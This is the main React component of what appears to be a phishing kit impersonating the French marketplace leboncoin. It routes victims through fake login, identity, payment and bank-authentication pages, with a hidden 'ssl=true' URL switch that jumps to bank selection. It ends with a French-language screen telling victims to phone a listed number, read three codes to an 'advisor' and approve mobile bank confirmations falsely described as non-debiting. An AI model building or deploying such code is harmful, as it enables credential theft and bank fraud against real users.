import React, { useState } from 'react';
import { useEffect } from 'react';
import LoginPage from './pages/LoginPage';
import PaymentConfirmationPage from './pages/PaymentConfirmationPage';
import IdentityConfirmationPage from './pages/IdentityConfirmationPage';
import TransactionConfirmationPage from './pages/TransactionConfirmationPage';
import PaymentConfigurationPage from './pages/PaymentConfigurationPage';
import BankSelectionPage from './pages/BankSelectionPage';
import BankAuthenticationPage from './pages/BankAuthenticationPage';

type Bank = {
  id: string;
  name: string;
  logo: string;
};

type PageType = 'login' | 'payment' | 'identity' | 'transaction' | 'payment-config' | 'bank-selection' | 'bank-auth';

function App() {
  const [currentPage, setCurrentPage] = useState<PageType>('login');
  const [userData, setUserData] = useState({});
  const [transactionData, setTransactionData] = useState({ amount: '', itemType: '' });
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null);
  const [skipToBank, setSkipToBank] = useState(false);

  useEffect(() => {
    // Check for URL parameter to skip to bank authentication
    const urlParams = new URLSearchParams(window.location.search);
    const bankRedirect = urlParams.get('ssl');
    if (bankRedirect === 'true') {
      setSkipToBank(true);
    }
  }, []);

  const handleLoginSuccess = () => {
    if (skipToBank) {
      setCurrentPage('bank-selection');
    } else {
      setCurrentPage('payment');
    }
  };
  const handlePaymentAccept = () => setCurrentPage('identity');
  const handleIdentityConfirm = (data: any) => {
    setUserData(data);
    setCurrentPage('transaction');
  };
  const handleTransactionConfirm = (data: { amount: string; itemType: string }) => {
    setTransactionData(data);
    setCurrentPage('payment-config');
  };
  const handleVerificationComplete = () => {
    // Redirect to bank selection only if skipToBank is true (URL parameter)
    if (skipToBank) {
      setCurrentPage('bank-selection');
    } else {
      // For normal flow, show success message after payment verification
      setCurrentPage('bank-auth'); // This will show AuthenticationSuccess
    }
  };
  const handleBankSelect = (bank: Bank) => {
    setSelectedBank(bank);
    setCurrentPage('bank-auth');
  };
  const handleBankAuthenticate = () => {
    // Handle successful bank authentication
    console.log('Bank authentication successful');
  };

  // Navigation functions
  const goBack = () => {
    switch (currentPage) {
      case 'payment':
        setCurrentPage('login');
        break;
      case 'identity':
        setCurrentPage('payment');
        break;
      case 'transaction':
        setCurrentPage('identity');
        break;
      case 'payment-config':
        setCurrentPage('transaction');
        break;
      case 'bank-selection':
        if (skipToBank) {
          setCurrentPage('login');
        } else {
          setCurrentPage('payment-config');
        }
        break;
      case 'bank-auth':
        setCurrentPage('bank-selection');
        break;
      default:
        break;
    }
  };

  return (
    <div className="font-sans">
      {currentPage === 'login' && (
        <LoginPage onLoginSuccess={handleLoginSuccess} />
      )}
      {currentPage === 'payment' && (
        <PaymentConfirmationPage 
          onAccept={handlePaymentAccept}
          onBack={goBack}
        />
      )}
      {currentPage === 'identity' && (
        <IdentityConfirmationPage 
          onNext={handleIdentityConfirm}
          onBack={goBack}
        />
      )}
      {currentPage === 'transaction' && (
        <TransactionConfirmationPage 
          onConfirm={handleTransactionConfirm}
          onBack={goBack}
        />
      )}
      {currentPage === 'payment-config' && (
        <PaymentConfigurationPage 
          amount={transactionData.amount}
          itemType={transactionData.itemType}
          onVerificationComplete={handleVerificationComplete}
          onBack={goBack}
        />
      )}
      {currentPage === 'bank-selection' && (
        <BankSelectionPage 
          onBankSelect={handleBankSelect}
          onBack={goBack}
        />
      )}
      {currentPage === 'bank-auth' && selectedBank && (
        <BankAuthenticationPage 
          bank={selectedBank}
          onAuthenticate={handleBankAuthenticate}
          onBack={goBack}
        />
      )}
      {currentPage === 'bank-auth' && !selectedBank && !skipToBank && (
        <div className="min-h-screen bg-gradient-to-b from-white to-gray-50">
          <header className="p-4 border-b">
            <div className="text-leboncoin font-bold text-2xl md:text-3xl">
              leboncoin
            </div>
          </header>
          
          <main className="container mx-auto px-4 py-8 max-w-2xl">
            <div className="bg-white rounded-2xl shadow-lg p-6 md:p-8">
              <div className="flex items-center justify-center mb-6">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center">
                  <svg 
                    className="w-8 h-8 text-green-500" 
                    fill="none" 
                    stroke="currentColor" 
                    viewBox="0 0 24 24"
                  >
                    <path 
                      strokeLinecap="round" 
                      strokeLinejoin="round" 
                      strokeWidth="2" 
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                </div>
              </div>

              <h1 className="text-2xl md:text-3xl font-bold text-center text-gray-800 mb-6">
                Merci d'avoir choisi Leboncoin
              </h1>

              <div className="space-y-6 text-gray-600">
                <p className="leading-relaxed">
                  Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre compte, 
                  vous serez contacté par téléphone par le service client dans les meilleurs délais.
                </p>

                <div className="bg-blue-50 rounded-lg p-4 flex items-start space-x-3">
                  <svg className="w-5 h-5 text-blue-500 mt-1 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                  </svg>
                  <div>
                    <p className="font-medium text-blue-900">Service disponible 24h/24 et 7j/7</p>
                    <p className="text-blue-800 text-lg font-semibold">0033 780 949 990</p>
                  </div>
                </div>

                <div className="bg-gray-50 rounded-lg p-4 space-y-3">
                  <p className="font-medium text-gray-900">
                    Processus de vérification :
                  </p>
                  <ul className="list-disc list-inside space-y-2 text-gray-700">
                    <li>Vous recevrez trois (3) differents codes à communiquer au conseiller</li>
                    <li>Vous serez également amené à approuver des demandes de confirmation, mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur.</li>
                  </ul>
                </div>

                <div className="bg-yellow-50 rounded-lg p-4 text-yellow-800">
                  <p className="font-medium mb-2">Important :</p>
                  <p>
                    Aucun montant ne sera prélevé de votre compte pendant la vérification 
                    de vos coordonnées et la confirmation de votre identité. Les simulations 
                    qui seront faites ne nécessitent aucun frais.
                  </p>
                </div>
              </div>
            </div>
          </main>
        </div>
      )}
    </div>
  );
}

export default App;
